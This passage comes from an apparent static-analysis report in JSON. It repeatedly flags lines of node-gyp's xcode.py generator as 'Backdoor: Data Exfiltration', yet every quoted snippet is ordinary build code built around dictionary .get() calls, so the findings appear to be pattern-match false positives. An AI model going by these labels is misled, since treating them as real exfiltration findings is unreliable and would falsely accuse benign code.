                      "markdown": "`                else:\n                    pbxp.AddOrGetFileInRootGroup(resource)\n\n            for header in spec.get(\"mac_framework_private_headers\", []):\n                AddHeaderToTarget(header, pbxp, xct, False)\n\n        # Add \"mac_framework_headers\". These can be valid for both frameworks\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1219,
                  "startColumn": 26,
                  "endLine": 1219,
                  "endColumn": 31,
                  "snippet": {
                    "text": "                    pbxp.AddOrGetFileInRootGroup(item)\n\n        # Add \"sources\".\n        for source in spec.get(\"sources\", []):\n            (source_root, source_extension) = posixpath.splitext(source)\n            if source_extension[1:] not in rules_by_ext:\n                # AddSourceToTarget will add the file to a root group if it's not\n",
                    "rendered": {
                      "text": "                    pbxp.AddOrGetFileInRootGroup(item)\n\n        # Add \"sources\".\n        for source in spec.get(\"sources\", []):\n            (source_root, source_extension) = posixpath.splitext(source)\n            if source_extension[1:] not in rules_by_ext:\n                # AddSourceToTarget will add the file to a root group if it's not\n",
                      "markdown": "`                    pbxp.AddOrGetFileInRootGroup(item)\n\n        # Add \"sources\".\n        for source in spec.get(\"sources\", []):\n            (source_root, source_extension) = posixpath.splitext(source)\n            if source_extension[1:] not in rules_by_ext:\n                # AddSourceToTarget will add the file to a root group if it's not\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1215,
                  "startColumn": 32,
                  "endLine": 1215,
                  "endColumn": 37,
                  "snippet": {
                    "text": "            if skip_excluded_files:\n                groups = [x for x in groups if not x.endswith(\"_excluded\")]\n            for group in groups:\n                for item in rule.get(group, []):\n                    pbxp.AddOrGetFileInRootGroup(item)\n\n        # Add \"sources\".\n",
                    "rendered": {
                      "text": "            if skip_excluded_files:\n                groups = [x for x in groups if not x.endswith(\"_excluded\")]\n            for group in groups:\n                for item in rule.get(group, []):\n                    pbxp.AddOrGetFileInRootGroup(item)\n\n        # Add \"sources\".\n",
                      "markdown": "`            if skip_excluded_files:\n                groups = [x for x in groups if not x.endswith(\"_excluded\")]\n            for group in groups:\n                for item in rule.get(group, []):\n                    pbxp.AddOrGetFileInRootGroup(item)\n\n        # Add \"sources\".\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1136,
                  "startColumn": 45,
                  "endLine": 1136,
                  "endColumn": 50,
                  "snippet": {
                    "text": "                    # The prerequisites for this rule are the rule source itself and\n                    # the set of additional rule inputs, if any.\n                    prerequisites = [rule_source]\n                    prerequisites.extend(rule.get(\"inputs\", []))\n                    for prerequisite_index, prerequisite in enumerate(prerequisites):\n                        if prerequisite_index == len(prerequisites) - 1:\n                            eol = \"\"\n",
                    "rendered": {
                      "text": "                    # The prerequisites for this rule are the rule source itself and\n                    # the set of additional rule inputs, if any.\n                    prerequisites = [rule_source]\n                    prerequisites.extend(rule.get(\"inputs\", []))\n                    for prerequisite_index, prerequisite in enumerate(prerequisites):\n                        if prerequisite_index == len(prerequisites) - 1:\n                            eol = \"\"\n",
                      "markdown": "`                    # The prerequisites for this rule are the rule source itself and\n                    # the set of additional rule inputs, if any.\n                    prerequisites = [rule_source]\n                    prerequisites.extend(rule.get(\"inputs\", []))\n                    for prerequisite_index, prerequisite in enumerate(prerequisites):\n                        if prerequisite_index == len(prerequisites) - 1:\n                            eol = \"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1058,
                  "startColumn": 30,
                  "endLine": 1058,
                  "endColumn": 35,
                  "snippet": {
                    "text": "                        AddResourceToTarget(output, pbxp, xct)\n\n                # Do we have a message to print when this rule runs?\n                message = rule.get(\"message\")\n                if message:\n                    message = gyp.common.EncodePOSIXShellArgument(message)\n                    message = ExpandXcodeVariables(message, rule_input_dict)\n",
                    "rendered": {
                      "text": "                        AddResourceToTarget(output, pbxp, xct)\n\n                # Do we have a message to print when this rule runs?\n                message = rule.get(\"message\")\n                if message:\n                    message = gyp.common.EncodePOSIXShellArgument(message)\n                    message = ExpandXcodeVariables(message, rule_input_dict)\n",
                      "markdown": "`                        AddResourceToTarget(output, pbxp, xct)\n\n                # Do we have a message to print when this rule runs?\n                message = rule.get(\"message\")\n                if message:\n                    message = gyp.common.EncodePOSIXShellArgument(message)\n                    message = ExpandXcodeVariables(message, rule_input_dict)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1052,
                  "startColumn": 24,
                  "endLine": 1052,
                  "endColumn": 29,
                  "snippet": {
                    "text": "                # is marked to process outputs as bundle resource, do so.\n                was_mac_bundle_resource = rule_source in tgt_mac_bundle_resources\n                if was_mac_bundle_resource or int(\n                    rule.get(\"process_outputs_as_mac_bundle_resources\", False)\n                ):\n                    for output in concrete_outputs_for_this_rule_source:\n                        AddResourceToTarget(output, pbxp, xct)\n",
                    "rendered": {
                      "text": "                # is marked to process outputs as bundle resource, do so.\n                was_mac_bundle_resource = rule_source in tgt_mac_bundle_resources\n                if was_mac_bundle_resource or int(\n                    rule.get(\"process_outputs_as_mac_bundle_resources\", False)\n                ):\n                    for output in concrete_outputs_for_this_rule_source:\n                        AddResourceToTarget(output, pbxp, xct)\n",
                      "markdown": "`                # is marked to process outputs as bundle resource, do so.\n                was_mac_bundle_resource = rule_source in tgt_mac_bundle_resources\n                if was_mac_bundle_resource or int(\n                    rule.get(\"process_outputs_as_mac_bundle_resources\", False)\n                ):\n                    for output in concrete_outputs_for_this_rule_source:\n                        AddResourceToTarget(output, pbxp, xct)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1044,
                  "startColumn": 27,
                  "endLine": 1044,
                  "endColumn": 32,
                  "snippet": {
                    "text": "                concrete_outputs_all.extend(concrete_outputs_for_this_rule_source)\n\n                # TODO(mark): Should verify that at most one of these is specified.\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    for output in concrete_outputs_for_this_rule_source:\n                        AddSourceToTarget(output, type, pbxp, xct)\n\n",
                    "rendered": {
                      "text": "                concrete_outputs_all.extend(concrete_outputs_for_this_rule_source)\n\n                # TODO(mark): Should verify that at most one of these is specified.\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    for output in concrete_outputs_for_this_rule_source:\n                        AddSourceToTarget(output, type, pbxp, xct)\n\n",
                      "markdown": "`                concrete_outputs_all.extend(concrete_outputs_for_this_rule_source)\n\n                # TODO(mark): Should verify that at most one of these is specified.\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    for output in concrete_outputs_for_this_rule_source:\n                        AddSourceToTarget(output, type, pbxp, xct)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1026,
                  "startColumn": 34,
                  "endLine": 1026,
                  "endColumn": 39,
                  "snippet": {
                    "text": "                }\n\n                concrete_outputs_for_this_rule_source = []\n                for output in rule.get(\"outputs\", []):\n                    # Fortunately, Xcode and make both use $(VAR) format for their\n                    # variables, so the expansion is the only transformation necessary.\n                    # Any remaining $(VAR)-type variables in the string can be given\n",
                    "rendered": {
                      "text": "                }\n\n                concrete_outputs_for_this_rule_source = []\n                for output in rule.get(\"outputs\", []):\n                    # Fortunately, Xcode and make both use $(VAR) format for their\n                    # variables, so the expansion is the only transformation necessary.\n                    # Any remaining $(VAR)-type variables in the string can be given\n",
                      "markdown": "`                }\n\n                concrete_outputs_for_this_rule_source = []\n                for output in rule.get(\"outputs\", []):\n                    # Fortunately, Xcode and make both use $(VAR) format for their\n                    # variables, so the expansion is the only transformation necessary.\n                    # Any remaining $(VAR)-type variables in the string can be given\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1008,
                  "startColumn": 35,
                  "endLine": 1008,
                  "endColumn": 40,
                  "snippet": {
                    "text": "            messages = []\n            actions = []\n\n            for rule_source in rule.get(\"rule_sources\", []):\n                rule_source_dirname, rule_source_basename = posixpath.split(rule_source)\n                (rule_source_root, rule_source_ext) = posixpath.splitext(\n                    rule_source_basename\n",
                    "rendered": {
                      "text": "            messages = []\n            actions = []\n\n            for rule_source in rule.get(\"rule_sources\", []):\n                rule_source_dirname, rule_source_basename = posixpath.split(rule_source)\n                (rule_source_root, rule_source_ext) = posixpath.splitext(\n                    rule_source_basename\n",
                      "markdown": "`            messages = []\n            actions = []\n\n            for rule_source in rule.get(\"rule_sources\", []):\n                rule_source_dirname, rule_source_basename = posixpath.split(rule_source)\n                (rule_source_root, rule_source_ext) = posixpath.splitext(\n                    rule_source_basename\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 926,
                  "startColumn": 43,
                  "endLine": 926,
                  "endColumn": 48,
                  "snippet": {
                    "text": "        # tgt_mac_bundle_resources holds the list of bundle resources so\n        # the rule processing can check against it.\n        if is_bundle:\n            tgt_mac_bundle_resources = spec.get(\"mac_bundle_resources\", [])\n        else:\n            tgt_mac_bundle_resources = []\n\n",
                    "rendered": {
                      "text": "        # tgt_mac_bundle_resources holds the list of bundle resources so\n        # the rule processing can check against it.\n        if is_bundle:\n            tgt_mac_bundle_resources = spec.get(\"mac_bundle_resources\", [])\n        else:\n            tgt_mac_bundle_resources = []\n\n",
                      "markdown": "`        # tgt_mac_bundle_resources holds the list of bundle resources so\n        # the rule processing can check against it.\n        if is_bundle:\n            tgt_mac_bundle_resources = spec.get(\"mac_bundle_resources\", [])\n        else:\n            tgt_mac_bundle_resources = []\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 919,
                  "startColumn": 25,
                  "endLine": 919,
                  "endColumn": 30,
                  "snippet": {
                    "text": "                for output in action[\"outputs\"]:\n                    AddSourceToTarget(output, type, pbxp, xct)\n\n            if int(action.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                for output in action[\"outputs\"]:\n                    AddResourceToTarget(output, pbxp, xct)\n\n",
                    "rendered": {
                      "text": "                for output in action[\"outputs\"]:\n                    AddSourceToTarget(output, type, pbxp, xct)\n\n            if int(action.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                for output in action[\"outputs\"]:\n                    AddResourceToTarget(output, pbxp, xct)\n\n",
                      "markdown": "`                for output in action[\"outputs\"]:\n                    AddSourceToTarget(output, type, pbxp, xct)\n\n            if int(action.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                for output in action[\"outputs\"]:\n                    AddResourceToTarget(output, pbxp, xct)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 915,
                  "startColumn": 25,
                  "endLine": 915,
                  "endColumn": 30,
                  "snippet": {
                    "text": "                prebuild_index = prebuild_index + 1\n\n            # TODO(mark): Should verify that at most one of these is specified.\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                for output in action[\"outputs\"]:\n                    AddSourceToTarget(output, type, pbxp, xct)\n\n",
                    "rendered": {
                      "text": "                prebuild_index = prebuild_index + 1\n\n            # TODO(mark): Should verify that at most one of these is specified.\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                for output in action[\"outputs\"]:\n                    AddSourceToTarget(output, type, pbxp, xct)\n\n",
                      "markdown": "`                prebuild_index = prebuild_index + 1\n\n            # TODO(mark): Should verify that at most one of these is specified.\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                for output in action[\"outputs\"]:\n                    AddSourceToTarget(output, type, pbxp, xct)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 872,
                  "startColumn": 28,
                  "endLine": 872,
                  "endColumn": 33,
                  "snippet": {
                    "text": "            # declared outputs and automatically ensure that they exist for us.\n\n            # Do we have a message to print when this action runs?\n            message = action.get(\"message\")\n            if message:\n                message = \"echo note: \" + gyp.common.EncodePOSIXShellArgument(message)\n            else:\n",
                    "rendered": {
                      "text": "            # declared outputs and automatically ensure that they exist for us.\n\n            # Do we have a message to print when this action runs?\n            message = action.get(\"message\")\n            if message:\n                message = \"echo note: \" + gyp.common.EncodePOSIXShellArgument(message)\n            else:\n",
                      "markdown": "`            # declared outputs and automatically ensure that they exist for us.\n\n            # Do we have a message to print when this action runs?\n            message = action.get(\"message\")\n            if message:\n                message = \"echo note: \" + gyp.common.EncodePOSIXShellArgument(message)\n            else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 843,
                  "startColumn": 51,
                  "endLine": 843,
                  "endColumn": 56,
                  "snippet": {
                    "text": "        # that case.\n        if type != \"none\" and (spec_actions or spec_rules) and not ninja_wrapper:\n            support_xccl = CreateXCConfigurationList(configuration_names)\n            support_target_suffix = generator_flags.get(\n                \"support_target_suffix\", \" Support\"\n            )\n            support_target_properties = {\n",
                    "rendered": {
                      "text": "        # that case.\n        if type != \"none\" and (spec_actions or spec_rules) and not ninja_wrapper:\n            support_xccl = CreateXCConfigurationList(configuration_names)\n            support_target_suffix = generator_flags.get(\n                \"support_target_suffix\", \" Support\"\n            )\n            support_target_properties = {\n",
                      "markdown": "`        # that case.\n        if type != \"none\" and (spec_actions or spec_rules) and not ninja_wrapper:\n            support_xccl = CreateXCConfigurationList(configuration_names)\n            support_target_suffix = generator_flags.get(\n                \"support_target_suffix\", \" Support\"\n            )\n            support_target_properties = {\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 829,
                  "startColumn": 25,
                  "endLine": 829,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        xcode_target_to_target_dict[xct] = spec\n\n        spec_actions = spec.get(\"actions\", [])\n        spec_rules = spec.get(\"rules\", [])\n\n        # Xcode has some \"issues\" with checking dependencies for the \"Compile\n        # sources\" step with any source files/headers generated by actions/rules.\n",
                    "rendered": {
                      "text": "        xcode_target_to_target_dict[xct] = spec\n\n        spec_actions = spec.get(\"actions\", [])\n        spec_rules = spec.get(\"rules\", [])\n\n        # Xcode has some \"issues\" with checking dependencies for the \"Compile\n        # sources\" step with any source files/headers generated by actions/rules.\n",
                      "markdown": "`        xcode_target_to_target_dict[xct] = spec\n\n        spec_actions = spec.get(\"actions\", [])\n        spec_rules = spec.get(\"rules\", [])\n\n        # Xcode has some \"issues\" with checking dependencies for the \"Compile\n        # sources\" step with any source files/headers generated by actions/rules.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 828,
                  "startColumn": 27,
                  "endLine": 828,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        xcode_targets[qualified_target] = xct\n        xcode_target_to_target_dict[xct] = spec\n\n        spec_actions = spec.get(\"actions\", [])\n        spec_rules = spec.get(\"rules\", [])\n\n        # Xcode has some \"issues\" with checking dependencies for the \"Compile\n",
                    "rendered": {
                      "text": "        xcode_targets[qualified_target] = xct\n        xcode_target_to_target_dict[xct] = spec\n\n        spec_actions = spec.get(\"actions\", [])\n        spec_rules = spec.get(\"rules\", [])\n\n        # Xcode has some \"issues\" with checking dependencies for the \"Compile\n",
                      "markdown": "`        xcode_targets[qualified_target] = xct\n        xcode_target_to_target_dict[xct] = spec\n\n        spec_actions = spec.get(\"actions\", [])\n        spec_rules = spec.get(\"rules\", [])\n\n        # Xcode has some \"issues\" with checking dependencies for the \"Compile\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 822,
                  "startColumn": 32,
                  "endLine": 822,
                  "endColumn": 37,
                  "snippet": {
                    "text": "            parent=pbxp,\n            force_outdir=spec.get(\"product_dir\"),\n            force_prefix=spec.get(\"product_prefix\"),\n            force_extension=spec.get(\"product_extension\"),\n        )\n        pbxp.AppendProperty(\"targets\", xct)\n        xcode_targets[qualified_target] = xct\n",
                    "rendered": {
                      "text": "            parent=pbxp,\n            force_outdir=spec.get(\"product_dir\"),\n            force_prefix=spec.get(\"product_prefix\"),\n            force_extension=spec.get(\"product_extension\"),\n        )\n        pbxp.AppendProperty(\"targets\", xct)\n        xcode_targets[qualified_target] = xct\n",
                      "markdown": "`            parent=pbxp,\n            force_outdir=spec.get(\"product_dir\"),\n            force_prefix=spec.get(\"product_prefix\"),\n            force_extension=spec.get(\"product_extension\"),\n        )\n        pbxp.AppendProperty(\"targets\", xct)\n        xcode_targets[qualified_target] = xct\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 821,
                  "startColumn": 29,
                  "endLine": 821,
                  "endColumn": 34,
                  "snippet": {
                    "text": "            target_properties,\n            parent=pbxp,\n            force_outdir=spec.get(\"product_dir\"),\n            force_prefix=spec.get(\"product_prefix\"),\n            force_extension=spec.get(\"product_extension\"),\n        )\n        pbxp.AppendProperty(\"targets\", xct)\n",
                    "rendered": {
                      "text": "            target_properties,\n            parent=pbxp,\n            force_outdir=spec.get(\"product_dir\"),\n            force_prefix=spec.get(\"product_prefix\"),\n            force_extension=spec.get(\"product_extension\"),\n        )\n        pbxp.AppendProperty(\"targets\", xct)\n",
                      "markdown": "`            target_properties,\n            parent=pbxp,\n            force_outdir=spec.get(\"product_dir\"),\n            force_prefix=spec.get(\"product_prefix\"),\n            force_extension=spec.get(\"product_extension\"),\n        )\n        pbxp.AppendProperty(\"targets\", xct)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 820,
                  "startColumn": 29,
                  "endLine": 820,
                  "endColumn": 34,
                  "snippet": {
                    "text": "        xct = xctarget_type(\n            target_properties,\n            parent=pbxp,\n            force_outdir=spec.get(\"product_dir\"),\n            force_prefix=spec.get(\"product_prefix\"),\n            force_extension=spec.get(\"product_extension\"),\n        )\n",
                    "rendered": {
                      "text": "        xct = xctarget_type(\n            target_properties,\n            parent=pbxp,\n            force_outdir=spec.get(\"product_dir\"),\n            force_prefix=spec.get(\"product_prefix\"),\n            force_extension=spec.get(\"product_extension\"),\n        )\n",
                      "markdown": "`        xct = xctarget_type(\n            target_properties,\n            parent=pbxp,\n            force_outdir=spec.get(\"product_dir\"),\n            force_prefix=spec.get(\"product_prefix\"),\n            force_extension=spec.get(\"product_extension\"),\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 813,
                  "startColumn": 34,
                  "endLine": 813,
                  "endColumn": 39,
                  "snippet": {
                    "text": "                % target_name\n            )\n\n        target_product_name = spec.get(\"product_name\")\n        if target_product_name is not None:\n            target_properties[\"productName\"] = target_product_name\n\n",
                    "rendered": {
                      "text": "                % target_name\n            )\n\n        target_product_name = spec.get(\"product_name\")\n        if target_product_name is not None:\n            target_properties[\"productName\"] = target_product_name\n\n",
                      "markdown": "`                % target_name\n            )\n\n        target_product_name = spec.get(\"product_name\")\n        if target_product_name is not None:\n            target_properties[\"productName\"] = target_product_name\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 754,
                  "startColumn": 31,
                  "endLine": 754,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        is_bundle = int(spec.get(\"mac_bundle\", 0)) or is_xctest\n        is_app_extension = int(spec.get(\"ios_app_extension\", 0))\n        is_watchkit_extension = int(spec.get(\"ios_watchkit_extension\", 0))\n        is_watch_app = int(spec.get(\"ios_watch_app\", 0))\n        if type != \"none\":\n            type_bundle_key = type\n            if is_xcuitest:\n",
                    "rendered": {
                      "text": "        is_bundle = int(spec.get(\"mac_bundle\", 0)) or is_xctest\n        is_app_extension = int(spec.get(\"ios_app_extension\", 0))\n        is_watchkit_extension = int(spec.get(\"ios_watchkit_extension\", 0))\n        is_watch_app = int(spec.get(\"ios_watch_app\", 0))\n        if type != \"none\":\n            type_bundle_key = type\n            if is_xcuitest:\n",
                      "markdown": "`        is_bundle = int(spec.get(\"mac_bundle\", 0)) or is_xctest\n        is_app_extension = int(spec.get(\"ios_app_extension\", 0))\n        is_watchkit_extension = int(spec.get(\"ios_watchkit_extension\", 0))\n        is_watch_app = int(spec.get(\"ios_watch_app\", 0))\n        if type != \"none\":\n            type_bundle_key = type\n            if is_xcuitest:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 753,
                  "startColumn": 40,
                  "endLine": 753,
                  "endColumn": 45,
                  "snippet": {
                    "text": "        is_xcuitest = int(spec.get(\"mac_xcuitest_bundle\", 0))\n        is_bundle = int(spec.get(\"mac_bundle\", 0)) or is_xctest\n        is_app_extension = int(spec.get(\"ios_app_extension\", 0))\n        is_watchkit_extension = int(spec.get(\"ios_watchkit_extension\", 0))\n        is_watch_app = int(spec.get(\"ios_watch_app\", 0))\n        if type != \"none\":\n            type_bundle_key = type\n",
                    "rendered": {
                      "text": "        is_xcuitest = int(spec.get(\"mac_xcuitest_bundle\", 0))\n        is_bundle = int(spec.get(\"mac_bundle\", 0)) or is_xctest\n        is_app_extension = int(spec.get(\"ios_app_extension\", 0))\n        is_watchkit_extension = int(spec.get(\"ios_watchkit_extension\", 0))\n        is_watch_app = int(spec.get(\"ios_watch_app\", 0))\n        if type != \"none\":\n            type_bundle_key = type\n",
